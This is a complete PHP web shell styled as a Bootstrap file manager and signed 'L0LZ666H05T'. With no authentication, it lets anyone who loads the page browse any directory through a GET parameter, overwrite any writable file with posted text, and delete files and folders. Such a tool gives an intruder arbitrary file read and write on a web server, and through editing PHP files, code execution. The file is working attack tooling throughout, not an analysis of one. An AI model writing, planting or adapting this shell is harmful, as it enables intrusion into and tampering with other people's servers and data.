<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<style type="text/css">
	th {
		text-align:center;
		padding:10px;
	} .icon {
		width:25px;
		height:25px;
	} textarea.edit {
		height:400px;
		resize:none;
	}
</style>
<br>
<div class="container">
<table class="table table-sm table-bordered">
<?php
define("SEP", @DIRECTORY_SEPARATOR);
function cwd() {
	if (isset($_GET['dir'])) {
		$cwd = $_GET['dir'];
		@chdir($cwd);
	} else {
		$cwd = @str_replace('\\', SEP, @getcwd());
	} return $cwd;
}
function perms($filename) {
$perms = @fileperms($filename);
switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms) {
	if (is_writable($filename)) {
		?>
		<span class="text-success"><?php print $perms ?></span>
		<?php
	} else {
		?>
		<span class="text-danger"><<?php print $perms ?></span>
		<?php
	}
}
function tools($cwd, $toolsname, $value) {
	$tools = "<option value='?dir=".$cwd."&do=".$toolsname."'>".$value."</option>";
	return $tools;
}
function action($doPost, $typeFile, $filename, $value) {
	$action = "<option value='?dir=".@cwd()."&do=".$doPost."&".$typeFile."=".$filename."'>".$value."</option>";
	return $action;
}
function size($filename) {
	$size = @filesize($filename)/1024;
	$size = @round($size, 3);
	if($size > 1024) {
		$size = round($size/1024,2). 'MB';
	} else {
		$size = $size. 'KB';
	} return $size;
}
function type($file) {
      if (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mimetype = finfo_file($finfo, $file);
        finfo_close($finfo);
      }
      else {
        $mimetype = mime_content_type($file);
      }
      if (empty($mimetype)) $mimetype = 'application/octet-stream';
      return $mimetype;
}
function delete($post, $filename) {
	if ($_GET['do'] == $post) {
		if ($_POST['type'] == 'dir') {
			if (is_dir($filename)) {
				if (@rmdir($filename)) {
					return true;
				} else {
					return false;
				}
			}
		}
		if ($_POST['type'] == 'file') {
			if (is_file($filename)) {
				if (@unlink($filename)) {
					return true;
				} else {
					return false;
				}
			}
		}
	}
}
function edit($post, $filename) {
	if ($_GET['do'] == $post) {
		?>
		<thead class="thead-light">
			<tr>
				<th>FILE EDITOR</th>
			</tr>
		</thead>
		<?php
		if (isset($_POST['submit'])) {
			$fp = @fopen($filename, "w");
			if (@fwrite($fp, $_POST['text'])) {
				?>
				<tr>
					<td>
						<div class="alert alert-success" role="alert">
							Edit file <b><?php print $filename ?></b> Successfully !
						</div>
					</td>
				</tr>
				<?php
			} else {
				?>
				<tr>
					<td>
						<div class="alert alert-danger" role="alert">
							Edit file <b><?php print $filename ?></b> Failed !
						</div>
					</td>
				</tr>
				<?php
			}
		} $file = @htmlspecialchars(@file_get_contents($filename));
		?>
		<tr>
			<td>
				<div class="container">
			    <div class="row">
				<div class="col mb-2 p-2 bg-light"><b>Filename :</b> <?php print $filename ?></div>
				<div class="col mb-2 p-2 bg-light"><b>Size : </b> <?php print @size($filename) ?></div>
				<div class="w-100"></div>
				<div class="col mb-2 p-2 bg-light"><b>Permission : </b><?php print @permission($filename, @perms($filename)) ?></div>
				<div class="col mb-2 p-2 bg-light"><b>Type : </b><?php print @type($filename) ?></div>
				<div class="w-100"></div>
				<div class="col mb-2 p-2 bg-light">
					<select class="form-control form-control-sm" onclick="if (this.value)window.location=(this.value)">
						<option selected></option>
						<?php print @tools(@cwd(), "", "BACK") ?>
					</select>
				</div>
			    </div>
		        </div>
			</td>
		</tr>
		<form method="post">
			<tr>
				<td colspan="2">
					<textarea class="form-control edit" name="text"><?php print $file ?></textarea>
				</td>
			</tr>
			<tr>
				<td colspan="2">
					<input type="submit" name="submit" class="btn btn-success" style="width:100%;">
				</td>
			</tr>
		</form>
		<?php
		exit();
	}
}

// ACTION
@edit("edit", $_GET['file']);
@delete("delete", $_GET['file'])
?>
	<thead class="thead-light">
	<tr>
		<th>FILENAME</th>
		<th>PERMISSION</th>
		<th>SIZE</th>
		<th>ACTION</th>
	</tr>
</thead>
<?php
$getPATH = @scandir(@cwd());
foreach ($getPATH as $dir) {
	if (!is_dir($dir)) continue;
	if ($dir === '.' || $dir === '..') continue;
	?>
	<tr>
		<td> 
			<img src="https://opengameart.org/sites/default/files/Flat%20Folder%20icon.png" class="icon"> 
			<a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
		</td>
		<td>
			<center><?php print @permission($dir, @perms($dir)) ?></center>
		</td>
		<td>
			<center>--</center>
		</td>
		<td>
			<select class="form-control form-control-sm" onclick="if (this.value)window.location=(this.value)">
				<option selected></option>
				<?php print @action("delete", "file", $dir, "Delete") ?>
			</select>
			<input type="hidden" name="type" value="dir">
		</td>
	</tr>
	<?php
}
foreach ($getPATH as $file) {
	if (!is_file($file)) continue;
	?>
	<tr>
		<td> 
			<img src="http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png" class="icon"> 
			<?php print $file ?>
		</td>
		<td>
			<center><?php print @permission($file, @perms($file)) ?></center>
		</td>
		<td>
			<center><?php print @size($file) ?></center>
		</td>
		<td>
			<select class="form-control form-control-sm" onclick="if (this.value)window.location=(this.value)">
				<option selected></option>
				<?php print @action("edit", "file", $file, "Edit") ?>
				<?php print @action("delete", "file", $file, "Delete") ?>
			</select>
			<input type="hidden" name="type" value="file">
		</td>
	</tr>
	<?php
}
?>
<thead class="thead-light">
	<tr>
		<th colspan="4">
			&copy; <?php print @date("Y") ?> - L0LZ666H05T
		</th>
	</tr>
</thead>
</table>
</div>
